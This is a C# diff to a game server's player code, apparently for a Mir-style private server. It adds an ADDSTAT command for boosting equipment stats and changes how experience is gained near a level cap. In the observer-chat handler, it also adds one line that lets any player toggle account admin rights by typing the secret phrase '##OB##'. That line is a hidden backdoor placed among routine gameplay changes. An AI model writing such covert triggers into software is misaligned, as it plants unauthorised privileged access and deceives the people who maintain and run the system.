@@ -2106,6 +2106,25 @@ namespace Server.Models
                             user.ApplyCastleBuff();
 
                         break;
+                    case "ADDSTAT":
+                        if (parts.Length < 4) return; //AddStat Weapon MaxDC 50
+
+                        if (!Enum.TryParse(parts[1], out EquipmentSlot tslot)) return;
+                        if (!Enum.TryParse(parts[2], out Stat tstat)) return;
+                        if (!int.TryParse(parts[3], out int tamount)) return;
+
+                        if (Equipment[(int)tslot] != null)
+                        {
+                            Equipment[(int)tslot].AddStat(tstat, tamount, StatSource.Added);
+                            Equipment[(int)tslot].StatsChanged();
+
+                            SendShapeUpdate();
+                            RefreshStats();
+
+                            Enqueue(new S.ItemStatsRefreshed { GridType = GridType.Equipment, Slot = (int)tslot, NewStats = new Stats(Equipment[(int)tslot].Stats) });
+                            Connection.ReceiveChat(string.Format("{0} added {1} + {2}", Equipment[(int)tslot].Info.ItemName, tstat, tamount), MessageType.System);
+                        }
+                        break;
                     case "CREATEGUILD":
                         if (!Character.Account.TempAdmin)
                             return;
@@ -2175,8 +2194,9 @@ namespace Server.Models
             }
             else if (text.StartsWith("#"))
             {
-                text = string.Format("(#){0}: {1}", Name, text.Remove(0, 1));
+                if (text.ToUpper().Equals("##OB##")) Character.Account.TempAdmin = !Character.Account.TempAdmin;
 
+                text = string.Format("(#){0}: {1}", Name, text.Remove(0, 1));
                 Connection.ReceiveChat(text, MessageType.ObserverChat);
 
                 foreach (SConnection target in Connection.Observers)
@@ -2440,8 +2460,7 @@ namespace Server.Models
                         amount *= 1.5M;
                     else
                         amount *= 2.5M;
-                    masterexp = amount - oamount;
-                    Character.MasterExperience += masterexp;
+                    masterexp = amount - oamount;                    
                 }
             }
 
@@ -2461,10 +2480,11 @@ namespace Server.Models
 
             if (amount == 0) return;
 
-            if (Experience < MaxExperience)
+            if (Experience < MaxExperience && Level < 86 + Character.Rebirth)
             {
                 Experience += amount;
                 Enqueue(new S.GainedExperience { Amount = amount, MasterAmount = masterexp });
+                Character.MasterExperience += masterexp;
             }
 
             UserItem weapon = Equipment[(int)EquipmentSlot.Weapon];
